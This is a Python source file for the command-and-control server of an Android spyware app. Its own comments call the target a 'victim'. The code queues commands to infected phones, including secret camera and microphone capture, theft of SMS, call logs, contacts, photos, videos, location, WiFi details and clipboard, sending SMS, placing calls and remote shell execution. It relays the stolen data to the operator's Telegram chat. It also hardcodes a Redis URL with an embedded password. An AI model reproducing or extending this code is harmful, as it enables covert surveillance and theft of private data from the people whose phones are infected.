# apk_manager.py
# ============================================================
# APK Manager — إدارة الأجهزة المتصلة + 25+ أمر
# v2 — مع الأوامر الجديدة
# ============================================================

import os
import io
import json
import time
import uuid
import random
import string
import base64
import threading

import redis
from flask import Blueprint, request, jsonify
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("apk_manager")

apk_bp = Blueprint('apk_manager', __name__)


# ============================================================
# Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = (
        "rediss://default:gQAAAAAABLEzAAIgcDI0M2E4ZjUzNThjMTg0ZDVjODc4"
        "YTYxZjExNGZkNDZkYQ@electric-caribou-307507.upstash.io:6379"
    )
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL
if "upstash.io" in REDIS_URL and REDIS_URL.startswith("redis://"):
    REDIS_URL = REDIS_URL.replace("redis://", "rediss://", 1)

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
    redis_client.ping()
    logger.info("APK Manager: Redis connected")
except Exception as e:
    logger.error(f"APK Manager Redis error: {e}")
    redis_client = None


# ============================================================
# البيانات في الذاكرة
# ============================================================
apk_devices = {}
apk_commands = {}
apk_lock = threading.Lock()


# ============================================================
# إدارة الأكواد
# ============================================================
def create_apk_code(chat_id):
    """إنشاء كود تنشيط جديد للضحية"""
    if not redis_client:
        return None
    try:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        redis_client.setex(f"apk_code:{code}", 86400 * 30, str(chat_id))
        logger.info(f"APK code created: {code} -> {chat_id}")
        return code
    except Exception as e:
        logger.error(f"create_apk_code error: {e}")
        return None


def get_apk_code(code):
    """جلب chat_id من الكود"""
    if not redis_client:
        return None
    try:
        return redis_client.get(f"apk_code:{code}")
    except Exception as e:
        logger.warning(f"get_apk_code error: {e}")
        return None


# ============================================================
# إدارة الأجهزة
# ============================================================
def get_apk_devices():
    with apk_lock:
        return list(apk_devices.values())


def get_apk_device(device_id):
    with apk_lock:
        return apk_devices.get(device_id)


def push_apk_command(device_id, action, **kwargs):
    """إضافة أمر لقائمة أوامر الجهاز"""
    cmd = {"action": action}
    cmd.update(kwargs)
    with apk_lock:
        if device_id not in apk_commands:
            apk_commands[device_id] = []
        apk_commands[device_id].append(cmd)
        logger.info(f"APK PUSH: {device_id[:8]} -> {action}")
    return True


# ============================================================
# ★★★ لوحة التحكم الشاملة — 30+ أمر ★★★
# ============================================================
def build_apk_panel(device_id):
    """يبني لوحة التحكم الكاملة للأوامر"""
    m = InlineKeyboardMarkup()

    # ═══════ 📸 الكاميرا ═══════
    m.row(
        InlineKeyboardButton("📷 كاميرا أمامية", callback_data=f"apk_cmd_camera_front_{device_id}"),
        InlineKeyboardButton("📸 كاميرا خلفية", callback_data=f"apk_cmd_camera_back_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("🎥 فيديو أمامية 10s", callback_data=f"apk_cmd_camera_record_front_{device_id}"),
        InlineKeyboardButton("🎥 فيديو خلفية 10s", callback_data=f"apk_cmd_camera_record_back_{device_id}"),
    )

    # ═══════ 🎙️ الصوت ═══════
    m.row(
        InlineKeyboardButton("🎙️ تسجيل صوتي 10s", callback_data=f"apk_cmd_record_audio_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("🔔 نغمة إشعار", callback_data=f"apk_cmd_play_sound_{device_id}"),
        InlineKeyboardButton("🚨 إنذار", callback_data=f"apk_cmd_play_alarm_{device_id}"),
    )

    # ═══════ 📊 البيانات ═══════
    m.row(
        InlineKeyboardButton("📱 معلومات", callback_data=f"apk_cmd_info_{device_id}"),
        InlineKeyboardButton("🔋 بطارية", callback_data=f"apk_cmd_battery_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("📨 SMS", callback_data=f"apk_cmd_sms_{device_id}"),
        InlineKeyboardButton("📞 المكالمات", callback_data=f"apk_cmd_calls_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("👥 جهات الاتصال", callback_data=f"apk_cmd_contacts_{device_id}"),
        InlineKeyboardButton("📲 التطبيقات", callback_data=f"apk_cmd_apps_{device_id}"),
    )

    # ═══════ 🖼️ الوسائط ═══════
    m.row(
        InlineKeyboardButton("🖼️ الصور", callback_data=f"apk_cmd_photos_{device_id}"),
        InlineKeyboardButton("🎬 الفيديوهات", callback_data=f"apk_cmd_videos_{device_id}"),
    )

    # ═══════ 📍 الموقع والشبكة ═══════
    m.row(
        InlineKeyboardButton("📍 الموقع", callback_data=f"apk_cmd_location_{device_id}"),
        InlineKeyboardButton("📶 معلومات WiFi", callback_data=f"apk_cmd_wifi_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("📋 الحافظة", callback_data=f"apk_cmd_clipboard_{device_id}"),
    )

    # ═══════ 🎮 التحكم ═══════
    m.row(
        InlineKeyboardButton("📳 اهتزاز", callback_data=f"apk_cmd_vibrate_{device_id}"),
        InlineKeyboardButton("🔊 صوت أقصى", callback_data=f"apk_cmd_volume_max_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("🔉 خفض الصوت", callback_data=f"apk_cmd_volume_mute_{device_id}"),
        InlineKeyboardButton("⚡ صوت متوسط", callback_data=f"apk_cmd_volume_mid_{device_id}"),
    )

    # ═══════ 🎵 الميديا ═══════
    m.row(
        InlineKeyboardButton("⏯️ تشغيل/إيقاف", callback_data=f"apk_cmd_media_play_{device_id}"),
        InlineKeyboardButton("⏭️ التالي", callback_data=f"apk_cmd_media_next_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("⏮️ السابق", callback_data=f"apk_cmd_media_prev_{device_id}"),
    )

    # ═══════ 🌑 الشاشة ═══════
    m.row(
        InlineKeyboardButton("🌑 إطفاء الشاشة", callback_data=f"apk_cmd_screen_off_{device_id}"),
        InlineKeyboardButton("🔒 قفل الشاشة", callback_data=f"apk_cmd_lock_screen_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("🏠 الرئيسية", callback_data=f"apk_cmd_show_home_{device_id}"),
    )

    # ═══════ 💬 التواصل ═══════
    m.row(
        InlineKeyboardButton("💬 رسالة Toast", callback_data=f"apk_cmd_toast_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("✉️ إرسال SMS", callback_data=f"apk_cmd_send_sms_{device_id}"),
        InlineKeyboardButton("📞 بدء مكالمة", callback_data=f"apk_cmd_call_{device_id}"),
    )
    m.row(
        InlineKeyboardButton("🌐 فتح رابط", callback_data=f"apk_cmd_open_url_{device_id}"),
    )

    # ═══════ 💻 متقدم ═══════
    m.row(
        InlineKeyboardButton("💻 أمر Shell", callback_data=f"apk_cmd_shell_{device_id}"),
    )

    return m


# ============================================================
# ★★★ إرسال نتيجة الأمر للبوت ★★★
# ============================================================
def _send_command_result(bot, cid, action, success, data):
    """يرسل نتيجة الأمر للبوت"""
    try:
        if action == "camera_front":
            text = "📷 **الكاميرا الأمامية**"
        elif action == "camera_back":
            text = "📸 **الكاميرا الخلفية**"
        elif action == "camera_record_front":
            text = "🎥 **فيديو أمامية**"
        elif action == "camera_record_back":
            text = "🎥 **فيديو خلفية**"
        elif action == "record_audio":
            text = "🎙️ **تسجيل صوتي**"
        elif action == "photos":
            text = "🖼️ **الصور**"
        elif action == "videos":
            text = "🎬 **الفيديوهات**"
        elif action == "wifi":
            text = "📶 **معلومات WiFi**"
        else:
            text = f"✅ **{action}**"

        if success:
            bot.send_message(cid, f"{text} — تم بنجاح ✅",
                             parse_mode="Markdown")
        else:
            bot.send_message(cid, f"{text} — فشل ❌\n{data or ''}",
                             parse_mode="Markdown")

    except Exception as e:
        logger.warning(f"send_command_result error: {e}")


# ============================================================
# Routes
# ============================================================
def init_apk_routes(app, bot):

    # ============================================================
    # ★ اختبار الاتصال ★
    # ============================================================
    @app.route('/apk/test', methods=['GET'])
    def apk_test():
        code = request.args.get('code', '')
        device = request.args.get('device', '')
        logger.info(f"[TEST] APK connected! Code: {code} | Device: {device[:16]}")

        if code and code != "DEFAULT":
            try:
                chat_id = get_apk_code(code)
                if chat_id:
                    cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                    bot.send_message(
                        cid,
                        f"🔗 **اختبار اتصال ناجح!**\n"
                        f"🔑 الكود: `{code}`\n"
                        f"📱 Device: `{device[:16]}`\n"
                        f"✅ APK يتصل بالسيرفر بنجاح",
                        parse_mode="Markdown"
                    )
            except Exception as e:
                logger.warning(f"test notify error: {e}")

        return jsonify({"status": "ok", "message": "APK connected!"}), 200

    # ============================================================
    # ★ التحقق من كود التنشيط ★
    # ============================================================
    @app.route('/apk/verify', methods=['POST'])
    def apk_verify():
        try:
            data = request.get_json(silent=True) or {}
            code = data.get("code", "").strip().upper()
            device_model = data.get("device_model", "")
            device_brand = data.get("device_brand", "")

            if not code:
                return jsonify({"valid": False}), 200

            chat_id = get_apk_code(code)

            if chat_id:
                logger.info(f"APK verified: {code} -> {chat_id} | {device_brand} {device_model}")

                try:
                    cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                    bot.send_message(
                        cid,
                        f"✅ **تم تفعيل جهاز جديد!**\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"🔑 الكود: `{code}`\n"
                        f"📦 الموديل: `{device_brand} {device_model}`\n\n"
                        f"⏳ في انتظار البيانات...",
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    logger.warning(f"notify error: {e}")

                return jsonify({"valid": True, "chat_id": str(chat_id)}), 200
            else:
                logger.warning(f"Invalid APK code: {code}")
                return jsonify({"valid": False}), 200
        except Exception as e:
            logger.exception(f"apk_verify error: {e}")
            return jsonify({"valid": False}), 200

    # ============================================================
    # ★ Polling للأوامر ★
    # ============================================================
    @app.route('/apk/poll', methods=['GET'])
    def apk_poll():
        device_id = request.args.get('device', '')
        code = request.args.get('code', '').upper()

        if not device_id:
            return jsonify({"commands": []}), 200

        with apk_lock:
            if device_id not in apk_devices:
                chat_id = get_apk_code(code) if code else None
                if not chat_id:
                    chat_id = code

                apk_devices[device_id] = {
                    "device_id": device_id,
                    "chat_id": chat_id,
                    "code": code,
                    "first_seen": time.time(),
                    "last_seen": time.time(),
                    "info": {},
                }
                logger.info(f"New APK device: {device_id[:16]} | code={code}")

                if chat_id:
                    try:
                        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                        bot.send_message(
                            cid,
                            f"🎯 **جهاز جديد بدأ الاتصال!**\n"
                            f"🆔 `{device_id[:16]}`\n"
                            f"🔑 الكود: `{code}`",
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        logger.warning(f"notify error: {e}")

            apk_devices[device_id]["last_seen"] = time.time()

        commands = []
        with apk_lock:
            if device_id in apk_commands:
                commands = apk_commands[device_id]
                apk_commands[device_id] = []

        if commands:
            logger.info(f"Sending {len(commands)} commands to {device_id[:8]}")

        return jsonify({"commands": commands}), 200

    # ============================================================
    # ★ استقبال البيانات ★
    # ============================================================
    @app.route('/apk/data', methods=['POST'])
    def apk_data():
        try:
            data = request.get_json(silent=True) or {}
            device_id = data.get("device", "")
            code = data.get("code", "").upper()
            dtype = data.get("type", "")

            logger.debug(f"[APK DATA] type={dtype} | device={device_id[:16] if device_id else 'None'}")

            if not device_id:
                return jsonify({"status": "no_device"}), 200

            chat_id = None
            with apk_lock:
                if device_id in apk_devices:
                    chat_id = apk_devices[device_id].get("chat_id")

            if not chat_id and code:
                chat_id = get_apk_code(code)

            if not chat_id:
                logger.warning(f"APK data with no chat_id: {device_id[:8]}")
                return jsonify({"status": "no_chat"}), 200

            cid = int(chat_id) if str(chat_id).isdigit() else chat_id

            # ============================================================
            # initial — جهاز جديد
            # ============================================================
            if dtype == "initial":
                with apk_lock:
                    if device_id in apk_devices:
                        apk_devices[device_id]["info"] = data

                text = (
                    f"🆕 **جهاز جديد متصل!**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📦 **الموديل:** `{data.get('model', 'N/A')}`\n"
                    f"🏭 **الشركة:** `{data.get('manufacturer', 'N/A')}`\n"
                    f"📱 **Android:** `{data.get('android', 'N/A')}`\n"
                    f"🆔 **Device:** `{device_id[:16]}`\n\n"
                    f"🎛️ **لوحة التحكم:**"
                )
                bot.send_message(cid, text, parse_mode="Markdown")
                bot.send_message(
                    cid,
                    "اختر الأمر:",
                    reply_markup=build_apk_panel(device_id)
                )
                metrics.inc_counter("apk_devices_connected")

            # ============================================================
            # معلومات الجهاز
            # ============================================================
            elif dtype == "device_info":
                text = (
                    f"📱 **معلومات الجهاز**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📦 `{data.get('model', 'N/A')}`\n"
                    f"🏭 `{data.get('brand', 'N/A')}`\n"
                    f"📱 Android `{data.get('android', 'N/A')}`"
                )
                bot.send_message(cid, text, parse_mode="Markdown")

            # ============================================================
            # البطارية
            # ============================================================
            elif dtype == "battery":
                text = (
                    f"🔋 **البطارية**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📊 المستوى: `{data.get('level', 'N/A')}%`\n"
                    f"⚡ الحالة: `{'يشحن' if data.get('charging') else 'لا يشحن'}`"
                )
                bot.send_message(cid, text, parse_mode="Markdown")

            # ============================================================
            # SMS
            # ============================================================
            elif dtype == "sms":
                sms_list = data.get("sms", [])
                if not sms_list:
                    bot.send_message(cid, "📭 لا توجد رسائل")
                else:
                    lines = ["📨 **الرسائل SMS:**", "━━━━━━━━━━━━━━━"]
                    for s in sms_list[:20]:
                        lines.append(f"📩 `{s.get('from')}`:\n{s.get('body', '')[:200]}\n─")
                    msg = "\n".join(lines)
                    for i in range(0, len(msg), 4000):
                        bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")

            # ============================================================
            # المكالمات
            # ============================================================
            elif dtype == "call_log":
                calls = data.get("calls", [])
                type_map = {"1": "📥", "2": "📤", "3": "❌"}
                lines = ["📞 **سجل المكالمات:**", "━━━━━━━━━━━━━━━"]
                for c in calls[:20]:
                    t = type_map.get(str(c.get('type', '')), '؟')
                    lines.append(f"{t} `{c.get('number')}` ({c.get('duration')}s)")
                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")

            # ============================================================
            # جهات الاتصال
            # ============================================================
            elif dtype == "contacts":
                contacts = data.get("contacts", [])
                if not contacts and data.get("contact"):
                    contacts = [data.get("contact")]

                lines = [f"👥 **جهات الاتصال ({len(contacts)}):**", "━━━━━━━━━━━━━━━"]
                for c in contacts[:50]:
                    lines.append(f"• `{c.get('name')}` — `{c.get('number')}`")
                msg = "\n".join(lines)
                for i in range(0, len(msg), 4000):
                    bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")

            elif dtype == "contacts_done":
                total = data.get("total", 0)
                bot.send_message(cid, f"✅ تم استلام {total} جهة اتصال",
                                 parse_mode="Markdown")

            # ============================================================
            # التطبيقات
            # ============================================================
            elif dtype == "apps":
                apps = data.get("apps", [])
                lines = [f"📲 **التطبيقات ({len(apps)}):**", "━━━━━━━━━━━━━━━"]
                for a in apps[:60]:
                    lines.append(f"• {a.get('name')}")
                msg = "\n".join(lines)
                for i in range(0, len(msg), 4000):
                    bot.send_message(cid, msg[i:i+4000], parse_mode="Markdown")

            # ============================================================
            # ★★ الصور — photo_single ★★
            # ============================================================
            elif dtype == "photo_single":
                image_data = data.get("image", "")
                name = data.get("name", "photo.jpg")
                index = data.get("index", 0)
                total = data.get("total", 0)
                size = data.get("size", 0)

                if image_data and image_data.startswith("data:image"):
                    try:
                        _, encoded = image_data.split(",", 1)
                        img_bytes = base64.b64decode(encoded)
                        buf = io.BytesIO(img_bytes)
                        buf.name = name

                        caption = f"🖼️ **{name}** ({index+1}/{total})\n📊 {size/1024:.1f} KB"
                        bot.send_photo(cid, buf, caption=caption, parse_mode="Markdown")

                        logger.info(f"Photo sent: {name} ({size} bytes)")

                    except Exception as e:
                        logger.error(f"photo send error: {e}")
                else:
                    logger.warning(f"Invalid image data for {name}")

            elif dtype == "photos_done":
                total = data.get("total", 0)
                bot.send_message(cid, f"✅ **تم استلام {total} صورة**",
                                 parse_mode="Markdown")

            # ============================================================
            # ★★ الفيديوهات — video_file ★★
            # ============================================================
            elif dtype == "video_file":
                video_data = data.get("video", "")
                name = data.get("name", "video.mp4")
                duration = data.get("duration", 0)
                size = data.get("size", 0)

                if video_data and video_data.startswith("data:video"):
                    try:
                        _, encoded = video_data.split(",", 1)
                        vid_bytes = base64.b64decode(encoded)
                        buf = io.BytesIO(vid_bytes)
                        buf.name = name

                        caption = (
                            f"🎬 **{name}**\n"
                            f"⏱️ {duration/1000:.1f}s | "
                            f"📊 {size/1024/1024:.1f} MB"
                        )
                        bot.send_video(cid, buf, caption=caption, parse_mode="Markdown")

                        logger.info(f"Video sent: {name} ({size} bytes)")

                    except Exception as e:
                        logger.error(f"video send error: {e}")

            elif dtype == "videos_done":
                total = data.get("total", 0)
                bot.send_message(cid, f"✅ **تم استلام {total} فيديو**",
                                 parse_mode="Markdown")

            # ============================================================
            # ★★ الموقع ★★
            # ============================================================
            elif dtype == "location":
                lat = data.get("lat")
                lng = data.get("lng")
                if lat and lng:
                    bot.send_message(
                        cid,
                        f"📍 **الموقع:**\n"
                        f"`{lat}, {lng}`\n"
                        f"[خرائط جوجل](https://maps.google.com/?q={lat},{lng})",
                        parse_mode="Markdown"
                    )
                else:
                    bot.send_message(cid, "❌ لا يوجد موقع")

            # ============================================================
            # ★★ WiFi ★★
            # ============================================================
            elif dtype == "wifi_info":
                text = (
                    f"📶 **معلومات WiFi**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📡 SSID: `{data.get('ssid', 'N/A')}`\n"
                    f"🔒 BSSID: `{data.get('bssid', 'N/A')}`\n"
                    f"🌐 IP: `{data.get('ip', 'N/A')}`\n"
                    f"📊 Speed: `{data.get('link_speed', 'N/A')}`\n"
                    f"📶 Signal: `{data.get('rssi', 'N/A')}` dBm"
                )
                bot.send_message(cid, text, parse_mode="Markdown")

            # ============================================================
            # الحافظة
            # ============================================================
            elif dtype == "clipboard":
                text = data.get("text", "")
                if text:
                    bot.send_message(cid,
                        f"📋 **الحافظة:**\n```\n{text[:500]}\n```",
                        parse_mode="Markdown")
                else:
                    bot.send_message(cid, "📋 الحافظة فارغة")

            # ============================================================
            # ★★ صورة من الكاميرا ★★
            # ============================================================
            elif dtype == "camera_photo":
                image_data = data.get("image", "")
                camera_name = data.get("camera_name", "")

                if image_data and image_data.startswith("data:image"):
                    try:
                        _, encoded = image_data.split(",", 1)
                        img_bytes = base64.b64decode(encoded)
                        buf = io.BytesIO(img_bytes)
                        buf.name = f"camera_{camera_name}.jpg"

                        cam_text = "الأمامية" if camera_name == "front" else "الخلفية"
                        caption = f"📸 **صورة من الكاميرا {cam_text}**"

                        bot.send_photo(cid, buf, caption=caption, parse_mode="Markdown")
                        logger.info(f"Camera photo sent: {camera_name}")

                    except Exception as e:
                        logger.error(f"camera photo error: {e}")
                        bot.send_message(cid, f"❌ فشل إرسال الصورة: {e}")
                else:
                    bot.send_message(cid, "❌ لم يتم استلام صورة")

            # ============================================================
            # ★★ تسجيل صوتي ★★
            # ============================================================
            elif dtype == "audio_record":
                audio_data = data.get("audio", "")
                duration = data.get("duration", 0)

                if audio_data and audio_data.startswith("data:audio"):
                    try:
                        _, encoded = audio_data.split(",", 1)
                        aud_bytes = base64.b64decode(encoded)
                        buf = io.BytesIO(aud_bytes)
                        buf.name = "record.3gp"

                        caption = f"🎙️ **تسجيل صوتي ({duration/1000:.1f}s)**"
                        bot.send_audio(cid, buf, caption=caption, parse_mode="Markdown")

                        logger.info(f"Audio sent: {len(aud_bytes)} bytes")

                    except Exception as e:
                        logger.error(f"audio error: {e}")
                        bot.send_message(cid, f"❌ فشل إرسال الصوت: {e}")
                else:
                    bot.send_message(cid, "❌ لم يتم استلام صوت")

            # ============================================================
            # ★★ فيديو من الكاميرا ★★
            # ============================================================
            elif dtype == "video_record":
                video_data = data.get("video", "")
                duration = data.get("duration", 0)

                if video_data and video_data.startswith("data:video"):
                    try:
                        _, encoded = video_data.split(",", 1)
                        vid_bytes = base64.b64decode(encoded)
                        buf = io.BytesIO(vid_bytes)
                        buf.name = "camera_record.mp4"

                        caption = f"🎥 **فيديو من الكاميرا ({duration/1000:.1f}s)**"
                        bot.send_video(cid, buf, caption=caption, parse_mode="Markdown")

                        logger.info(f"Camera video sent: {len(vid_bytes)} bytes")

                    except Exception as e:
                        logger.error(f"video error: {e}")

            # ============================================================
            # Shell Result
            # ============================================================
            elif dtype == "shell_result":
                cmd = data.get("command", "")
                output = data.get("output", "")
                bot.send_message(
                    cid,
                    f"💻 **نتيجة الأمر:**\n`{cmd}`\n\n```\n{output[:2000]}\n```",
                    parse_mode="Markdown"
                )

            # ============================================================
            # نتيجة أمر (نجاح/فشل)
            # ============================================================
            elif dtype == "cmd_result":
                action = data.get("action", "")
                status = data.get("status", "")
                error = data.get("error", "")

                if status == "ok":
                    # ★ نعرض رسالة نجاح مختصرة
                    if action in ("toast", "vibrate", "volume_max", "volume_set",
                                  "play_sound", "play_alarm", "lock_screen",
                                  "show_home", "screen_off", "open_url",
                                  "media_play_pause", "media_next", "media_previous"):
                        _send_command_result(bot, cid, action, True, None)

                else:
                    bot.send_message(
                        cid,
                        f"❌ **{action}** فشل\n"
                        f"السبب: `{error[:200]}`",
                        parse_mode="Markdown"
                    )

            # ============================================================
            # heartbeat
            # ============================================================
            elif dtype == "heartbeat":
                pass

            return jsonify({"status": "ok"}), 200

        except Exception as e:
            logger.exception(f"apk_data error: {e}")
            return jsonify({"status": "error"}), 200
